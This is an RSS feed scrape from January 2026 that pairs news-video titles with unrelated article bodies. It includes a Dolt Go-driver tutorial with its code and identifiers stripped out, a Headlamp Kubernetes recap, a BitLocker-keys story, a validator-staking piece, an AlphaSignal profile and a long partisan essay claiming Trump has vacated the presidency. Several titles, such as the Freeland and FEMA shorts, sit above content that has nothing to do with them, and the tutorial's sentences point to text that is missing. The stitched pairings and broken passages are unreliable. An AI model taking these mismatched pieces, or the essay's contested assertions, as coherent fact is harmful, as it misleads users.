Bell</title><link>https://www.youtube.com/watch?v=112kZ3fKIaE</link><author>Bloomberg Television</author><category>news</category><enclosure url="https://www.youtube.com/v/112kZ3fKIaE?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 22:50:11 +0000</pubDate><source url="https://www.youtube.com/channel/UCIALMKvObZNtJ6AmdCLP7Lg">News - Bloomberg</source><content:encoded><![CDATA[Comprehensive cross-platform coverage of the U.S. market close on Bloomberg Television, Bloomberg Radio, and YouTube with Romaine Bostick, Katie Greifeld, Carol Massar and Tim Stenovec.

The Register reports: Snover's retirement comes after a brief sojourn at Google as a Distinguished Engineer, following a lengthy stint at Microsoft, during which he pulled the company back from imposing a graphical user interface (GUI) on administrators who really just wanted a command line from which to run their scripts. Snover joined Microsoft as the 20th century drew to a close. The company was all about its Windows operating system and user interface in those days -- great for end users, but not so good for administrators managing fleets of servers. Snover correctly predicted a shift to server datacenters, which would require automated management. A powerful shell... a PowerShell, if you will.
 
[...] Over the years, Snover has dropped the occasional pearl of wisdom or shared memories from his time getting PowerShell off the ground. A recent favorite concerns the naming of Cmdlets and their original name in Monad: Function Units, or FUs. Snover wrote: "This abbreviation reflected the Unix smart-ass culture I was embracing at the time. Plus I was developing this in a hostile environment, and my sense of diplomacy was not yet fully operational." Snover doubtless has many more war stories to share. In the meantime, however, we wish him well. Many admins owe Snover thanks for persuading Microsoft that its GUI obsession did not translate to the datacenter, and for lengthy careers in gluing enterprise systems together with some scripted automation.]]></content:encoded></item><item><title>Chrystia Freeland: “The ball is in Putin’s court” #shorts #putin #ukraine #russia #zelenskiy #trump</title><link>https://www.youtube.com/shorts/89xK9z6Pv1I</link><author>Bloomberg Television</author><category>news</category><enclosure url="https://www.youtube.com/v/89xK9z6Pv1I?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 22:38:53 +0000</pubDate><source url="https://www.youtube.com/channel/UCIALMKvObZNtJ6AmdCLP7Lg">News - Bloomberg</source><content:encoded><![CDATA["The ball is in Putin's court."

Most
of our customers run Dolt as a server in Docker and connect to it over the network like any other
database server. But for programs written in Go, you can also connect to a Dolt database without a
separate server process, similar to SQLite. We call this the embedded use case, and it has suddenly
become a lot more relevant with Gas
Town migrating its agentic memory
storage to use Dolt as its
backend. Since Gas
Town is a Go process, it can use the embedded Dolt driver to communicate with an embedded Dolt
database.So, because Dolt’s embedded driver is about to get a lot more
action than it’s used to, we thought this would be a good time to give a tour of how it works. This
pattern is possible through the magic of Go’s  package, which lets you define a
database connection that any Go program can use to talk to your SQL backend with a single 
statement.In this tour, we’ll look at how Go’s SQL drivers work under the hood and show you how Dolt
implements one to provide access to an embedded Dolt database. Let’s take a look.Go’s SQL driver package is an abstraction that lets other
software libraries vend their own SQL connection logic through a common set of
interfaces. Application developers use a common interface to connect to any SQL database (MySQL,
Postgres, MariaDB, SQL Server, Dolt, etc.) without worrying about the specifics of the wire protocol
for that particular database.This is best illustrated with an example. Here’s how you connect to MySQL and read some rows.Let’s go over this example line by line and see what it does.This line is kind of magic and weird: the  tells Go that you’re not using any symbols from this
package, you’re importing it just for its side-effects. In this case, those side effects are
registering a driver called  with  package.A DSN is a data source name, almost always resembling a URL but often with some extra bits. Each
database vendor has their own format for these DSNs, but they all look pretty similar. You usually
embed the user name and password and some other metadata, like which database you want to connect
to, in this string.To open a connection, you just call  with the name of the driver and its matching
DSN. Easy! on a connection takes a query string and returns the resulting rows. puts the result of the query into normal Go datatypes, like  or .There are more complicated access patterns, and we haven’t touched on things like 
statements, but those are the basics.Let’s see how a  is implemented by examining the Dolt driver.Dolt’s embedded database driver is defined very simply.The  function is the special magic that requires you to use the  import on the database
driver of your choice. At program execution time, this code calls  to tell the
 package there’s a  implementation named “dolt”.Next we need a way to get a connection to the embedded database, which we do with the 
method. In the sample below, I’ve removed most of the error handling for brevity. You can read the
full source here.Dolt’s DSN format is basically a file URL with some extra query params. It looks something like
this:We parse this URL and extract the relevant query params out of it, then use those to create our
internal SQL engine representation, which is what Dolt uses to execute queries internally.This gives us a  with an engine it can use to execute queries. Let’s look at that next.Unlike the driver itself, the  type has some state. But it’s still very simple. Its main
job is to pass information down the line, from a call to  to a  type.The  impelementation is where real work begins to happen, in the  method.Here you can see that the statement’s real work is nearly all delegated to the SQL engine we created
in the initial call to . The rest of its functionality is just to translate between the
results that Dolt’s SQL engine provides and what the  interfaces expect. For that, we
have the  type.And that’s it! The job of these interfaces is really to act as a translation layer between the wire
protocol the database uses and the types that  expects. In the case of the Dolt
embedded driver, there’s no wire protocol: we’re accessing the SQL engine that queries the database
on disk directly and using the data structures it returns natively.A lot of developers prefer to use an ORM tool when interacting with their database, and in the Go
world, the most popular ORM library is Gorm. Gorm usually manages your
DB connection for you automatically, but in the case of Dolt embedded we want something slightly
different: we want it to use its MySQL dialect and logic but connect to an embedded Dolt database
connection. This is pretty easy to do.Note that we need to import both the MySQL driver and the Dolt driver for this to work. But
otherwise, it’s a standard Gorm setup.Go’s database drivers are a simple way for database application developers to connect to any of the
many different SQL databases you can run in production with a common interface. Standardizing these
interfaces made it easier for libraries like Gorm to offer support for a larger variety of different
database vendors, since the details of the wire protocols and other tricky bits are hidden by the
abstraction for most uses. And it’s pretty simple to write your own driver if you have a SQL data
source you want other people to connect to.Want to discuss Go database drivers or learn more about Dolt? Visit us on the DoltHub

Thursday, January 22, 2026This announcement is a recap from a post originally published on the Headlamp blog.Headlamp has come a long way in 2025. The project has continued to grow – reaching more teams across platforms, powering new workflows and integrations through plugins, and seeing increased collaboration from the broader community.We wanted to take a moment to share a few updates and highlight how Headlamp has evolved over the past year.Joining Kubernetes SIG UIThis year marked a big milestone for the project: Headlamp is now officially part of Kubernetes SIG UI. This move brings roadmap and design discussions even closer to the core Kubernetes community and reinforces Headlamp’s role as a modern, extensible UI for the project.Linux Foundation mentorshipThis year, we were excited to work with several students through the Linux Foundation’s Mentorship program, and our mentees have already left a visible mark on Headlamp: built the KEDA plugin, adding a UI in Headlamp to view and manage KEDA resources like ScaledObjects and ScaledJobs. set up an OpenTelemetry-based observability stack for Headlamp, wiring up metrics, logs, and traces so the project is easier to monitor and debug. led a UX audit of Headlamp plugins, identifying usability issues and proposing design improvements and personas for plugin users. developed the Karpenter plugin, giving Headlamp a focused view into Karpenter autoscaling resources and decisions. improved Gateway API support, so you can see networking relationships on the resource map, as well as improved support for many of the new Gateway API resources. worked on backend caching for Kubernetes API calls, reducing load on the API server and improving performance in Headlamp.Managing multiple clusters is challenging: teams often switch between tools and lose context when trying to see what runs where. Headlamp solves this by giving you a single view to compare clusters side-by-side. This makes it easier to understand workloads across environments and reduces the time spent hunting for resources.View of multi-cluster workloadsKubernetes apps often span multiple namespaces and resource types, which makes troubleshooting feel like piecing together a puzzle. We’ve added  to give you an application-centric view that groups related resources across multiple namespaces – and even clusters. This allows you to reduce sprawl, troubleshoot faster, and collaborate without digging through YAML or cluster-wide lists.View of the new Projects featureNew “Projects” feature for grouping namespaces into app- or team-centric projectsExtensible Projects details view that plugins can customize with their own tabs and actionsNavigation and ActivitiesDay-to-day ops in Kubernetes often means juggling logs, terminals, YAML, and dashboards across clusters. We redesigned Headlamp’s navigation to treat these as first-class “activities” you can keep open and come back to, instead of one-off views you lose as soon as you click away.A new task bar/activities model lets you pin logs, exec sessions, and details as ongoing activitiesAn activity overview with a “Close all” action and cluster informationMulti-select and global filters in tablesWhen something breaks in production, the first two questions are usually “where is it?” and “what is it connected to?” We’ve upgraded both search and the map view so you can get from a high-level symptom to the right set of objects much faster.View of the new Advanced Search featureAn Advanced search view that supports rich, expression-based queries over Kubernetes objectsImproved global search that understands labels and multiple search items, and can even update your current namespace based on what you findEndpointSlice support in the Network sectionA richer map view that now includes Custom Resources and Gateway API objectsWe’ve put real work into making OIDC setup clearer and more resilient, especially for in-cluster deployments.View of user information for OIDC clustersUser information displayed in the top bar for OIDC-authenticated usersPKCE support for more secure authentication flows, as well as hardened token refresh handlingDocumentation for using the access token using -oidc-use-access-token=trueImproved support for public OIDC clients like AKS and EKSWe’ve broadened how you deploy and source apps via Headlamp, specifically supporting vanilla Helm repos.A more capable Helm chart with optional backend TLS termination, PodDisruptionBudgets, custom pod labels, and moreImproved formatting and added missing access token arg in the Helm chartNew in-cluster Helm support with an  flag and a service proxyFinally, we’ve spent a lot of time on the things you notice every day but don’t always make headlines: startup time, list views, log viewers, accessibility, and small network UX details. A continuous accessibility self-audit has also helped us identify key issues and make Headlamp easier for everyone to use.View of the Learn section in docsSignificant desktop improvements, with up to 60% faster app loads and much quicker dev-mode reloads for contributorsNumerous table and log viewer refinements: persistent sort order, consistent row actions, copy-name buttons, better tooltips, and more forgiving log inputsAccessibility and localization improvements, including fixes for zoom-related layout issues, better color contrast, improved screen reader support, and expanded language coverageMore control over resources, with live pod CPU/memory metrics, richer pod details, and inline editing for secrets and CRD fieldsA refreshed documentation and plugin onboarding experience, including a “Learn” section and plugin showcaseA more complete NetworkPolicy UI and network-related polishNightly builds available for early testingPlugins and extensibilityDiscovering plugins is simpler now – no more hopping between Artifact Hub and assorted GitHub repos. Browse our dedicated Plugins page for a curated catalog of Headlamp-endorsed plugins, along with a showcase of featured plugins.View of the Plugins showcaseManaging Kubernetes often means memorizing commands and juggling tools. Headlamp’s new AI Assistant changes this by adding a natural-language interface built into the UI. Now, instead of typing  or digging through YAML you can ask, “Is my app healthy?” or “Show logs for this deployment,” and get answers in context, speeding up troubleshooting and smoothing onboarding for new users. Learn more about it here.Alongside the new AI Assistant, we’ve been growing Headlamp’s plugin ecosystem so you can bring more of your workflows into a single UI, with integrations like Minikube, Karpenter, and more.Highlights from the latest plugin releases:Minikube plugin, providing a locally stored single node Minikube clusterKarpenter plugin, with support for Azure Node Auto-Provisioning (NAP)KEDA plugin, which you can learn more about hereAlongside new additions, we’ve also spent time refining plugins that many of you already use, focusing on smoother workflows and better integration with the core UI.View of the Backstage plugin: Updated for Flux v2.7, with support for newer CRDs, navigation fixes so it works smoothly on recent clusters: Now supports Helm repos in addition to Artifact Hub, can run in-cluster via /serviceproxy, and shows both current and latest app versions: Improved card layout and accessibility, plus dependency and Storybook test updates: Dependency and build updates, more info hereWe’ve focused on making it faster and clearer to build, test, and ship Headlamp plugins, backed by improved documentation and lighter tooling.View of the Plugin Development guideImproved type checking for Headlamp APIs, restored Storybook support for component testing, and reduced dependencies for faster installs and fewer updatesDocumented plugin install locations, UI signifiers in Plugin Settings, and labels that differentiated shipped, UI-installed, and dev-mode pluginsWe've also been investing in keeping Headlamp secure – both by tightening how authentication works and by staying on top of upstream vulnerabilities and tooling.We've been keeping up with security updates, regularly updating dependencies and addressing upstream security issues.We tightened the Helm chart's default security context and fixed a regression that broke the plugin manager.We've improved OIDC security with PKCE support, helping unblock more secure and standards-compliant OIDC setups when deploying Headlamp in-cluster.Thank you to everyone who has contributed to Headlamp this year – whether through pull requests, plugins, or simply sharing how you're using the project. Seeing the different ways teams are adopting and extending the project is a big part of what keeps us moving forward. If your organization uses Headlamp, consider adding it to our adopters list.If you haven't tried Headlamp recently, all these updates are available today. Check out the latest Headlamp release, explore the new views, plugins, and docs, and share your feedback with us on Slack or GitHub – your feedback helps shape where Headlamp goes next.]]></content:encoded></item><item><title>Microsoft Gave FBI a Set of BitLocker Encryption Keys To Unlock Suspects&apos; Laptops</title><link>https://it.slashdot.org/story/26/01/23/1910235/microsoft-gave-fbi-a-set-of-bitlocker-encryption-keys-to-unlock-suspects-laptops?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>BeauHD</author><category>tech</category><pubDate>Fri, 23 Jan 2026 22:02:00 +0000</pubDate><source url="https://slashdot.org/">Slashdot</source><content:encoded><![CDATA[An anonymous reader quotes a report from TechCrunch: Microsoft provided the FBI with the recovery keys to unlock encrypted data on the hard drives of three laptops as part of a federal investigation, Forbes reported on Friday. Many modern Windows computers rely on full-disk encryption, called BitLocker, which is enabled by default. This type of technology should prevent anyone except the device owner from accessing the data if the computer is locked and powered off.
 
But, by default, BitLocker recovery keys are uploaded to Microsoft's cloud, allowing the tech giant -- and by extension law enforcement -- to access them and use them to decrypt drives encrypted with BitLocker, as with the case reported by Forbes. The case involved several people suspected of fraud related to the Pandemic Unemployment Assistance program in Guam, a U.S. island in the Pacific. Local news outlet Pacific Daily News covered the case last year, reporting that a warrant had been served to Microsoft in relation to the suspects' hard drives.
 
Kandit News, another local Guam news outlet, also reported in October that the FBI requested the warrant six months after seizing the three laptops encrypted with BitLocker. [...] Microsoft told Forbes that the company sometimes provides BitLocker recovery keys to authorities, having received an average of 20 such requests per year.]]></content:encoded></item><item><title>How Big is a Final Fantasy Save File? #nintendo #retrogaming #retrotech #gamedev</title><link>https://www.youtube.com/shorts/BqeIlJpa5EA</link><author>NesHacker</author><category>yt</category><enclosure url="https://www.youtube.com/v/BqeIlJpa5EA?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 22:00:14 +0000</pubDate><source url="https://www.youtube.com/channel/UCXR5PCyUI2pG_a3ydnCIS-g">NesHacker</source><content:encoded><![CDATA[Support the channel: https://patreon.com/NesHacker]]></content:encoded></item><item><title>Reaction to ICE agents detaining 5-year-old in Minnesota | DW News</title><link>https://www.youtube.com/shorts/_T7l6ccIw28</link><author>DW News</author><category>news</category><enclosure url="https://www.youtube.com/v/_T7l6ccIw28?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 22:00:04 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[US Immigration and Customs Enforcement (ICE) detained a five-year-old and his father near Minneapolis, where thousands of ICE agents have been deployed in a massive immigration crackdown.

By Prash Pandit, VP Validation Business at A technical look at how decentralized validator architecture gives institutions better reliability, auditability, and system-level resilience.If you’ve ever actually run validators — not reviewed a diagram, not talked strategy in a meeting, but operated them — you figure out quickly that  isn’t passive. It behaves like a live distributed system. Clients drift. Gossip traffic gets noisy. Relays hiccup at precisely the wrong moment. And when you scale that across institutional-sized positions, the infrastructure stops being a supporting detail. It becomes part of your risk surface.Most institutional teams start with custodial platforms because those platforms make the early steps painless. That’s a reasonable first phase. Institutions have onboarding, governance, and compliance requirements that don’t just disappear because a blockchain is involved. But once you look at what a validator is actually responsible for — meeting attestation deadlines, proposing blocks on schedule, keeping up with fork-choice changes, routing through relays, managing duties that repeat every few seconds — the idea of putting all of that inside a sealed box starts to feel mismatched with how the network behaves. Validators aren’t static yield engines. They’re consensus actors.Centralized setups tend to run large validator fleets on nearly identical stacks. Same client builds. Same relay preferences. Same tuning. Same monitoring assumptions. That uniformity looks stable from the outside, but uniformity has a well-known weakness: when something breaks, it breaks everywhere at once. A client bug or a relay stall doesn’t stay local; it becomes a correlated event. Anyone who has worked through a real incident review knows how quickly that can turn into operational noise and awkward reporting questions.\
 is built to avoid that. Instead of relying on one operator’s environment, responsibilities get spread across several operators who don’t share the same failure modes. They run different clients. They make different operational choices. Their infrastructure isn’t a carbon copy of anyone else’s. You get genuine separation. Failures stay smaller.This is where decentralization begins to look less like a philosophy and more like the thing that keeps a large validator footprint stable.\
 takes that one step further. Instead of a single signer making decisions, you use threshold cryptography across multiple nodes. No operator holds the whole key. The validator acts only when enough shares arrive. If one node drifts, the validator doesn’t stall. If one node misconfigures its client, the validator doesn’t head toward slashing. It behaves more like other high-availability systems institutions already trust: distributed, fault-tolerant, and designed so no individual component can sink the whole service.\
This architecture also fixes a visibility gap. Eventually someone will ask why a validator underperformed in a specific epoch, or why duties were missed, or why a particular MEV path was chosen. In a centralized environment, you usually get an aggregated answer because everything underneath is identical. In a decentralized environment, operator-level differences exist by design, which makes performance observable. It gives institutions something they rarely get from sealed systems: the ability to reason about behavior the same way they would with any other critical workload.Key management improves too. Large centralized fleets often keep operational keys online to manage thousands of validators smoothly. It’s practical, but it’s still a single custody point. In a threshold-based decentralized setup, the key never exists in one place. No operator can act alone. The architecture itself enforces the guardrails. That aligns well with how institutional security models already work — distributed approvals, multi-party controls, and reduced single-operator exposure.Flexibility is another place decentralization pays off. Institutions don’t always worry about operator rotation at the start, but it surfaces sooner than expected. Policies change. Infrastructure standards shift. Governance committees ask new questions. In a centralized model, the whole validator setup — keys, clients, MEV routes, reporting — is bundled. Switching becomes expensive. In decentralized architectures, operators function as replaceable components. If one underperforms, you rotate them out without redesigning the validator from scratch.\
None of this means custodial platforms don’t add value. They absolutely do, especially for teams that want a low-friction introduction to staking. But institutions eventually move past the onboarding phase. They start caring about auditability, failure isolation, key distribution, and how the system behaves when conditions get messy. Those aren’t features you bolt on later. They come from the architecture.Proof-of-Stake wasn’t built for single-operator control. It was built for distributed participation. The closer institutional staking setups follow that pattern, the more predictable and transparent they become — not just in normal conditions but in the moments that matter.That’s why decentralized infrastructure ends up being non-negotiable. Not because it sounds good on paper, but because it delivers the reliability and clarity institutions already expect from every other critical system they run. It’s simply the architecture that scales with the network and with the responsibility that comes with meaningful stake.]]></content:encoded></item><item><title>Jibby Jones, by Ellis Parker Butler</title><link>https://standardebooks.org/ebooks/ellis-parker-butler/jibby-jones</link><author></author><enclosure url="https://standardebooks.org/ebooks/ellis-parker-butler/jibby-jones/downloads/ellis-parker-butler_jibby-jones.epub?source=feed" length="" type=""/><pubDate>Fri, 23 Jan 2026 21:43:30 +0000</pubDate><source url="https://standardebooks.org/feeds/rss/new-releases">Standard E-Books</source><content:encoded><![CDATA[Five boys who live near the Mississippi River embark on an adventure to find hidden pirate treasure.]]></content:encoded></item><item><title>Former FEMA admin on Texas winter storm prep</title><link>https://www.youtube.com/shorts/zF0rDFYtjm0</link><author>Bloomberg Television</author><category>news</category><enclosure url="https://www.youtube.com/v/zF0rDFYtjm0?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 21:43:01 +0000</pubDate><source url="https://www.youtube.com/channel/UCIALMKvObZNtJ6AmdCLP7Lg">News - Bloomberg</source><content:encoded><![CDATA[Former FEMA Administrator Deanne Criswell says that Texans need to prepare for the worse when it comes to the looming winter storm that will put intense pressure on the state's power grid.

Not in his previous term, and not this one, at least not so far. In fact, this term it has hardly even been attempted. If it weren’t for Representative Green honoring his oath of office it wouldn’t have even been tried at all. Even  are still in significant numbers joining their Republican colleagues in refusing to do what is needed to save our constitutional order, despite everything Trump has done from the moment he retook office—including taking the office, which he was ineligible to do as a confirmed insurrectionist—being entirely inconsistent with the Constitution’s instructions for how to achieve a democratically sustainable federalized union of states.Impeachment still needs to happen, for Trump and his minions, not just to cleanly expel Trump from the presidency but to disqualify him from ever returning to it. And that expulsion needs to happen with an urgency that really required it to have been completed at the latest by last March. Yet the way things are going, with Congress dragging its feet, it seems we’ll be lucky if it will even happen by  March, if at all. Moreover, with Trump upping the ante at every turn, we’ll be lucky if the nation, all its constituent states, and even most of the people who depend on the Constitution’s promises of liberty, freedom, and justice for all, are still standing by then if nothing is done to officially separate him from the powers of the office he continues to claim. After all, every day of delay is another day for a five year old to be shipped to a concentration camp in Texas. Even if the nation survives this presidency, it’s already clear we won’t all.But it turns out, Trump has already begun to separate himself from the presidency.  And that he has done so reveals another path the Constitution allows for retaking our democracy, starting now. On this appalling anniversary week of Trump’s installation as the 47th President of the United States, it is time to recognize an essential truth: he has functionally already abandoned the office. Sure, he still (nominally) lives in the White House, meets heads of state (and insults them), is answered to by the military (however ill-advisedly), signs bills (and pardons!), and at least superficially seems to be conducting the basic functions of the office. These are things that the Constitution allows presidents to do, not because, as Trump seems to think, the Constitution seeks to reward a single person with the special power to do any of them, but because these are governmental functions someone needs to do and it makes more sense to grant a chief executive the ability to do them than someone in any other branch of government.But the exercise of these functions is not the full extent of the job. The job of president, as the Constitution describes, also includes the requirements to “take care that the laws be faithfully executed,” and to fulfill the oath he swore upon taking office, which included the promise to “preserve, protect and defend the Constitution of the United States.” None of these obligations are incidental to the job; they are key counterbalances to the enormous power the position affords its occupant. Yet he has been doing none of them in any sort of meaningful way, if at all. In fact, all too often he instead does the exact opposite of what’s required by the job, including by engaging in his own criminality, abetting the malfeasance of others, and otherwise generally upending our constitutional order by ignoring statutes, treaties, and constitutional text, and turning every bit of power he’s managed to wring from his position against the very same public the Constitution says he works for.There are few situations where we would consider someone not doing what they were hired to do, and in fact doing the very opposite of what their job required, as still being employed in that job. If you hire a guard to watch the bank, you’d expect him not to help the robbers rob the bank. If you hired a doctor to treat patients, you’d expect him to not kill them instead. But if while on the job they did the opposite of what they were hired to do, you would understand them to have abandoned their position. You wouldn’t expect the guard who let in the robbers on Tuesday to still show up to work securing the place on Wednesday, or the doctor who euthanized his patients Thursday to show up to treat more on Friday; you would understand from the moment they did these things that you now have some vacancies to fill.Which is where we find ourselves. The degree to which Trump has refused to perform the requirements of his job, to say nothing of his regularly acting contrary to them, means that we effectively have a vacancy in the Executive Branch. Americans can no longer have any trust that he is working for us when he daily demonstrates that he is only working for himself. Or that he’ll enforce the law when he regularly transgresses it and enables others’ transgressions as well. Or that he’ll uphold the Constitution when he regularly violates the separation of powers and people’s protected rights. Or that he can be a protector of the country when he has used his position to attack it. Like with the larcenous bank guard or wayward doctor it would be irrational to believe that despite having acted in such conflict with the requirements of his job that it is a job he has nevertheless somehow still kept. Instead, by refusing to uphold his oath of office, and acting in so many ways counter to it, he has effectively abandoned the office he took that oath in order to enter.The Constitution says that when the office is vacant there is a succession process to fill it.  Where it is less specific is in instructing how a  vacancy, such as the kind we are experiencing, can be regarded as an official  one for purposes of triggering succession.  But it doesn’t say we can’t, and plenty of language in the Constitution says we can, and indeed must.Per Article II, Section 1, of the Constitution, succession happens when there is either a physical departure from the office by the President, such as through death or resignation, or a functional one, essentially measured by the “Inability to discharge the Powers and Duties of the said Office.” (The 12th Amendment, as amended by the 20th Amendment, also indicates that a vacancy is created when there is a “constitutional disability,” which would seem to include his ineligibility for the office as an additional obstacle to him being able to discharge the powers and duties of the office.) While for Trump there also remains the possibility of mental incapacity being yet another reason he is unable to fulfill the responsibilities of the office, in addition to his conscious abandonment of the position, it all boils down to the same thing: he has demonstrated that he is unable to continue serving in the role as the Constitution requires. The vacancy thus exists, and now it just needs to be officially recognized so that succession can begin.The 25th Amendment describes one avenue for such recognition, but that particular process seems unlikely to be pursued any time soon given that it would require equally compromised cabinet members to unite with the Vice President to support Trump’s displacement, which they are unlikely to do as long as they feel they benefit from Trump remaining in office (which is, of course, a reason why Hegseth, Rubio, Noem, Bondi, etc. should also themselves all be impeached, so that there’s a snowball’s chance that more ethical people could take their place for 25th Amendment purposes). But it seems unlikely that the Constitution meant the 25th Amendment to be the  process available for recognizing that effectively there’s already a vacancy in the presidency, for several reasons. For one thing, the way it is written it seems more attuned to articulating a plan for succession in the face of a  disability, like a coma, because it includes a mechanism by which the succession can be undone. Whereas abandoning the office, like Trump has done, does not seem, consistent with the spirit of the Constitution if not the letter, like something that can simply be undone without being re-elected. Furthermore, as we see here, the 25th Amendment does not correct for the sort of situation we find ourselves in now, where the people who could and should be invoking it are not, even though the essential problem remains: there is still no one currently at the helm of the United States of America doing the job in a way the Constitution requires. And such will remain the case regardless of whether Vance and company ever make a move to address it.Impeachment is of course another appropriate option for addressing a wayward president who is not living up to the job, but it, too, cannot be the only other means for handling a situation like this, where his failure to perform the job as required has already created the vacancy. For one thing, it suffers from a similar problem as the 25th Amendment, where the right of the public to have a president that lives up to his constitutional obligations is effectively being held hostage by recalcitrant officials—this time those in Congress—who are unwilling to uphold their own oaths of office and do what needs to be done to officially extricate America from Trump’s grasp. Furthermore, impeachment is also designed to pry someone out of a job they are actually doing, and not just someone who is not, as well as apply disqualification as a sanction. It is a mechanism useful for creating a vacancy, but the need now is just to recognize that one already exists.But that there is no other clearly established way for recognizing the vacancy does not mean there is no way. There appears to be another way.  And key to pursuing it is to stop treating as President someone who clearly is not.It would mean, first of all, challenging every bit of power Trump exercises nominally as president as being unlawful, and not just on its own terms as an act not permitted by statute or Constitution, given that most of the things he tries to do would still be unlawful even if a proper president tried to do them.  The challenge needs to be that  Trump does ostensibly as president is irredeemably illicit at its core.  Give the courts the opportunity to at last find that whatever power Trump attempts to wield is power he no longer has. Doing so would likely be an uphill battle, because no court has every nullified a presidency.  To the extent that legitimacy has been in contention, the historical preference has been to settle the matter politically, rather than legally—or at least it was, up until , when the Supreme Court announced that the courts were in the president-anointing business.  But it would make sense for the courts to be able to weigh in here, with respect to Trump, because why shouldn’t the Article III branch would have its own mechanism for addressing the vacancy of an absent president, especially while Articles I and II officials continue to abandon their own obligations to act in accordance with their own constitutional mechanisms.  No branch should have an exclusive monopoly on policing the president, and as long as there has been judicial review, none has.  The courts have long been able to hold presidents accountable to the Constitution.  And while there may be no clearly established roadmap for involving the courts this way, there is also nothing preventing it. The courts could be called upon to declare the office abandoned in various ways, and in response to challenges by various parties. Perhaps such an opportunity to challenge Trump’s legitimacy could arise if JD Vance gets ambitious and sues for a declaratory judgment that he is the actual president, because, while he’s no prize himself, at this point it certainly seems like he has a better claim to the office than Trump does. Perhaps it’s the states who can bring some sort of claim. Perhaps others who are affected by Trump’s abuse could sue too, just as they normally can challenge the lawfulness of his acts. Or perhaps the courts will have to weigh in when the military starts refusing Trump’s orders, as increasingly seems it likely will, as the ways Trump has been directing the military become more and more unlawful even on their own merits. In any case, one way or another it seems inevitable that the legitimacy of Trump’s continued presidency is going to be a question the courts will be called upon to answer, especially as the rest of our government refuses to.And while any litigation would eventually land at the Supreme Court, such as it is, these challenges still need to be pursued because every case before it ultimately stands on its own.  Even  is differentiable in key ways from the litigation that would reach it here.  And hope springs eternal that this time maybe the Court will even get the question before it right, as the stakes raised by these challenges have never been more clear.  Trump is running around acting with impunity, but as even the Supreme Court recognized in , immunity only attaches to official acts.  And if he has already effectively abandoned the office, then none of his acts can be.It is of course no small thing for anyone to declare a living president to have officially abandoned his office or otherwise take steps to delegitimize his occupancy in the office. Nor should it be something that easily can be done because, as we’ve seen with even just with 2020 election denial, once doubt creeps in about who is the legitimate president, the disagreement it causes can be destabilizing to our democratic order. In fact, it is likely that a big reason why Trump’s continued claim to the presidency has simply been accepted so broadly up to now, despite all the evidence, is that, by and large, we would rather delude ourselves into believing that he is the legitimate officeholder than risk the political instability of calling it into question.Nevertheless, there are limits to how long we can maintain the myth of his legitimacy, which Trump has been daily making less and less believable. Hegemony is powerful; Trump only gets to masquerade as a legitimate president for as long as we let him. We don’t have to let him. Which is why we should appeal to the courts, as well as Congress and any politician anywhere in government, to argue not just that Trump should be made to leave but that he’s already left, and that it’s finally time for the government to respond to that reality.It’s time to challenge his legitimacy because the Constitution does not take a time out.  It does not wait for midterms.  We are  entitled to a President that acts consistently with all of the Constitution’s requirements, and it tells us what happens when there isn’t someone doing so anymore. It is not for any of us to decide that this language suddenly somehow no longer applies.In fact, it would be dangerous to, or to deliberately wait months and months to finally address the problem, while in the meantime our nation and everything we’ve built over the course of nearly 250 years is ruined. Especially not when Trump’s abandonment of the job has created the exigent likelihood that an interloper without any personal constitutional authority may now be functionally acting as president instead of him, wielding the office’s powers without any of the accountability the Constitution normally requires of someone in that position. In other words, it may not be that we are just without a president but, worse, instead at the mercy of an unelected pretender who has stepped into the vacuum Trump’s abandonment has created because we have refused to fill that void first.There may of course be the fear that we risk a constitutional crisis to make such a serious move to deem the office vacant when the Constitution is not more specific that it is a move to be made. And it’s true; constitutional crises arise when we start making the most existentially important decisions about the nation’s governance without reference to a set of clear rules we’ve all agreed to. That we are in uncharted waters may thus give pause.But we are not without any instruction for how to navigate them. Even though the Constitution has not provided a specific process to follow perfectly tailored to this effective abandonment of the presidency that Trump has committed, it still provides enough guidance to recognize the position is vacant and proceed with succession accordingly. If anything, it is the refusal to recognize the vacancy, especially by Congress and the cabinet, that has been what’s unilaterally and unconstitutionally changed the rules we’ve all previously agreed to, by letting Trump nevertheless continue to occupy the position when he has in every other way abandoned the job. Given everything Trump has done, and the actual text of the Constitution forbidding it, challenging his right to remain the acknowledged president won’t invite a constitutional crisis; rather, it is the failure to bring that challenge which is why that crisis is already here.]]></content:encoded></item><item><title>The Future of Media Is Automated: Lior Alexander’s Vision for Information Infrastructure</title><link>https://hackernoon.com/the-future-of-media-is-automated-lior-alexanders-vision-for-information-infrastructure?source=rss</link><author>Jon Stojan Journalist</author><category>tech</category><pubDate>Fri, 23 Jan 2026 21:30:03 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[As artificial intelligence accelerates the creation of content, the internet has entered an era defined less by scarcity and more by saturation. Millions of new posts, research papers, and media artifacts appear daily, making discovery, not creation, the primary challenge. For , founder of , this shift marked the beginning of his work.Rather than asking how to produce more content, Alexander focused on a more fundamental question: how do people find what actually matters when everything is being generated at once?From Research Lab to System Builder’s path into AI began in 2017, when he joined the research lab of Turing Award–winning scientist Yoshua Bengio in Montreal. At the time, machine learning research was expanding rapidly, but access to meaningful insights remained limited.“Hundreds of papers were being uploaded every week,” Alexander recalled. “There was no effective way to filter them. Even researchers inside the lab were overwhelmed.”That experience shaped his thinking. Instead of focusing on model development alone, Alexander became interested in the infrastructure surrounding knowledge itself: how information is surfaced, ranked, and interpreted. He began experimenting with tools that could track research activity across the web, identify emerging signals, and surface them in a usable way.That early system would become the foundation of AlphaSignal.AlphaSignal was not designed as a traditional media company. From the beginning, it was structured as an automated system capable of detecting, ranking, and contextualizing information at scale. While most newsrooms rely on teams of editors and writers, AlphaSignal relies on software.“I built the entire system myself,” Alexander said. “The ranking models, the data pipelines, the publishing workflows, the branding. I didn’t have a team or outside funding.”The platform continuously scans technical papers, product releases, funding announcements, and research activity, identifying patterns that signal meaningful developments. Instead of reacting to trends after they peak, AlphaSignal aims to detect momentum early.That approach has proven effective. The platform now reaches more than 250,000 subscribers, over 500,000 followers, and has generated more than 200 million impressions. It also became an early visibility engine for companies such as ElevenLabs and Lovable, helping surface them before they reached mainstream 